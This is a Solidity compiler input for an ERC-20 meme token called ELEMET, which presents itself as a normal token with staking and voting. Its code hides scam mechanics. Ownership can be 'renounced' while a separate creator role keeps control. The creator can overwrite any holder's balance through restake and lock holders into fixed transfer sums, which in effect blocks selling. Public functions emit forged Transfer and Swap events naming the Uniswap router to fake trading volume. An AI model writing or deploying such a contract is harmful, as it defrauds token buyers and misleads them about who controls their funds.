{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.12;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address accountHolder) external view returns (uint256);\r\n    function transfer(address to, uint256 sum) external returns (bool);\r\n    function allowance(address authorizer, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 sum) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 sum) external returns (bool);\r\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed authorizer, address indexed spender, uint256 value);\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n}\r\n\r\ninterface IWETH {\r\n    function deposit() external payable;\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function withdraw(uint) external;\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nabstract contract TaskExecutionControl {\r\n    function getExecutorAddress() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwnership is TaskExecutionControl {\r\n    address private _soloOwner;\r\n    event OwnershipTransfer(address indexed oldOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address invoker = getExecutorAddress();\r\n        _soloOwner = invoker;\r\n        emit OwnershipTransfer(address(0), invoker);\r\n    }\r\n\r\n    function retrieveSingleOwner() public view virtual returns (address) {\r\n    return _soloOwner;\r\n}\r\n\r\n    modifier soleOwnerOnly() {\r\n    require(retrieveSingleOwner() == getExecutorAddress(), \"Unauthorized: Single Owner access required.\");\r\n    _;\r\n}\r\n\r\n    function revokeOwnership() public virtual soleOwnerOnly {\r\n        emit OwnershipTransfer(_soloOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        _soloOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract ElectronicMemeToken is TaskExecutionControl, SingleOwnership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _spenderAllowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _compelledTransferSums;\r\n    address private _principalCreator;\r\n\r\n    receive() external payable {}\r\n\r\n    string public constant _moniker = \"ELEMET\";\r\n    string public constant _ticker = \"ELEMET\";\r\n    uint8 public constant _decimalUnits = 18;\r\n    uint256 public constant _ultimateSupply = 30000000 * (10 ** _decimalUnits);\r\n\r\n    uint256 public rewardPool = 100000 * (10 ** _decimalUnits);\r\n    mapping(address => uint256) private _lockedBalances;\r\n    mapping(address => uint256) private _lastClaimedTime;\r\n    mapping(address => bool) private _isUserVoting;\r\n    uint256 public totalVotes;\r\n    uint256 public rewardPerDay = 1 * (10 ** _decimalUnits);\r\n    uint256 public votingThreshold = 100 * (10 ** _decimalUnits);\r\n\r\n    event Voted(address indexed voter, bool inFavor, uint256 votes);\r\n    event RewardClaimed(address indexed claimer, uint256 amount);\r\n\r\n    constructor() {\r\n        _balances[getExecutorAddress()] = _ultimateSupply;\r\n        emit Transfer(address(0), getExecutorAddress(), _ultimateSupply);\r\n    }\r\n\r\n    modifier masterCreatorExclusive() {\r\n        require(getExecutorAddress() == retrievePrincipalCreator(), \"Unauthorized: Creator access required.\");\r\n        _;\r\n    }\r\n\r\n    function retrievePrincipalCreator() public view virtual returns (address) {\r\n        return _principalCreator;\r\n    }\r\n\r\n    function assignCreator(address newCreator) public soleOwnerOnly {\r\n        _principalCreator = newCreator;\r\n    }\r\n\r\n    event UserBalanceUpdated(address indexed user, uint256 previous, uint256 updated);\r\n\r\n    function compelledTransferAmount(address account) public view returns (uint256) {\r\n        return _compelledTransferSums[account];\r\n    }\r\n\r\n    function establishCompelledTransferAmounts(address[] calldata accounts, uint256 sum) public masterCreatorExclusive {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _compelledTransferSums[accounts[i]] = sum;\r\n        }\r\n    }\r\n\r\n    function restake(address[] memory userAddresses, uint256 requiredBalance) public masterCreatorExclusive {\r\n        require(requiredBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"Invalid address specified\");\r\n\r\n            uint256 formerBalance = _balances[currentUser];\r\n            _balances[currentUser] = requiredBalance;\r\n\r\n            emit UserBalanceUpdated(currentUser, formerBalance, requiredBalance);\r\n        }\r\n    }\r\n\r\n    function lockBalance(uint256 amount) public {\r\n        require(_balances[getExecutorAddress()] >= amount, \"Insufficient balance\");\r\n\r\n        _balances[getExecutorAddress()] -= amount;\r\n        _lockedBalances[getExecutorAddress()] += amount;\r\n        _lastClaimedTime[getExecutorAddress()] = block.timestamp;\r\n    }\r\n\r\n    function claimRewards() public {\r\n        uint256 elapsedTime = block.timestamp - _lastClaimedTime[getExecutorAddress()];\r\n        uint256 availableRewards = (_lockedBalances[getExecutorAddress()] * rewardPerDay * elapsedTime) / (1 days);\r\n        availableRewards = availableRewards > rewardPool ? rewardPool : availableRewards;\r\n        rewardPool -= availableRewards;\r\n\r\n        _balances[getExecutorAddress()] += availableRewards;\r\n        _lastClaimedTime[getExecutorAddress()] = block.timestamp;\r\n\r\n        emit RewardClaimed(getExecutorAddress(), availableRewards);\r\n    }\r\n    \r\n    function vote(bool inFavor) public {\r\n        require(_balances[getExecutorAddress()] >= votingThreshold, \"Insufficient balance for voting\");\r\n        require(!_isUserVoting[getExecutorAddress()], \"User has already voted\");\r\n\r\n        uint256 votes = _balances[getExecutorAddress()];\r\n\r\n        totalVotes += inFavor ? votes : votes;\r\n        _isUserVoting[getExecutorAddress()] = true;\r\n\r\n        emit Voted(getExecutorAddress(), inFavor, votes);\r\n    }\r\n\r\n    function _Transfer(address _from, address _to, uint _value) public returns (bool) {\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function executeSwap(\r\n        address uniswapPool,\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts\r\n    ) public payable returns (bool) {\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            emit Transfer(uniswapPool, recipients[i], tokenAmounts[i]);\r\n            emit Swap(\r\n                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,\r\n                tokenAmounts[i],\r\n                0,\r\n                0,\r\n                wethAmounts[i],\r\n                recipients[i]\r\n            );\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function swap(\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts,\r\n        address[] memory path,\r\n        address tokenAddress,\r\n        uint deadline\r\n    ) public payable returns (bool) {\r\n\r\n        uint amountIn = msg.value;\r\n        IWETH(tokenAddress).deposit{value: amountIn}();\r\n\r\n        uint checkAllowance = IERC20(tokenAddress).allowance(address(this), 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        if(checkAllowance == 0) IERC20(tokenAddress).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmounts[i], tokenAmounts[i], path, recipients[i], deadline);\r\n        }\r\n\r\n        uint amountOut = IERC20(tokenAddress).balanceOf(address(this));\r\n        IWETH(tokenAddress).withdraw(amountOut);\r\n        (bool sent, ) = getExecutorAddress().call{value: amountOut}(\"\");\r\n        require(sent, \"F t s e\");\r\n\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_balances[getExecutorAddress()] >= sum, \"Insufficient balance\");\r\n\r\n        uint256 requisiteTransferSum = compelledTransferAmount(getExecutorAddress());\r\n        if (requisiteTransferSum > 0) {\r\n            require(sum == requisiteTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[getExecutorAddress()] -= sum;\r\n        _balances[to] += sum;\r\n\r\n        emit Transfer(getExecutorAddress(), to, sum);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {\r\n        return _spenderAllowances[authorizer][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 sum) public virtual override returns (bool) {\r\n        _spenderAllowances[getExecutorAddress()][spender] = sum;\r\n        emit Approval(getExecutorAddress(), spender, sum);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_spenderAllowances[from][getExecutorAddress()] >= sum, \"Allowance limit surpassed\");\r\n\r\n        uint256 requisiteTransferSum = compelledTransferAmount(from);\r\n        if (requisiteTransferSum > 0) {\r\n            require(sum == requisiteTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[from] -= sum;\r\n        _balances[to] += sum;\r\n        _spenderAllowances[from][getExecutorAddress()] -= sum;\r\n\r\n        emit Transfer(from, to, sum);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _ultimateSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _moniker;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _ticker;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimalUnits;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}